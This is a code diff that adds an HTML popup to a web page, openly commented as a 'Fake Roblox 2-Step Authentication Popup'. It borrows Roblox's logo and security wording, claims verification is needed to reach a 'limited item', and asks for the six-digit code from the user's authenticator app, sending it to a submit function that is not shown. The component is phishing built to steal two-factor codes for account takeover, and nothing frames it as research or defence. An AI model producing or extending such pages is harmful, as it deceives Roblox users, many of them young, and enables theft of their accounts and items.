@@ -290,6 +290,32 @@
         </div>
     </div>
 
+    <!-- Fake Roblox 2-Step Authentication Popup -->
+    <div id="roblox2StepPopup" class="roblox-auth-overlay" style="display: none;">
+        <div class="roblox-auth-modal">
+            <div class="roblox-auth-header">
+                <img src="https://images.rbxcdn.com/c69b74f49c6e418baf0d65e8915a409c.png" alt="Roblox" class="roblox-logo">
+                <h2>2-Step Verification Required</h2>
+                <span class="roblox-close" onclick="closeRobloxAuth()">&times;</span>
+            </div>
+            <div class="roblox-auth-body">
+                <div class="roblox-auth-icon">🔒</div>
+                <p>For your security, please verify your identity to continue accessing this limited item.</p>
+                <div class="roblox-auth-input-group">
+                    <label>Enter the 6-digit code from your authenticator app:</label>
+                    <input type="text" id="robloxAuthCode" class="roblox-auth-input" placeholder="000000" maxlength="6">
+                </div>
+                <div class="roblox-auth-buttons">
+                    <button class="roblox-btn roblox-btn-primary" onclick="submitRobloxAuth()">Verify</button>
+                    <button class="roblox-btn roblox-btn-secondary" onclick="closeRobloxAuth()">Cancel</button>
+                </div>
+                <div class="roblox-auth-footer">
+                    <p><small>This verification helps protect your account and items from unauthorized access.</small></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <footer>
         <div class="container">
             <div class="footer-content">
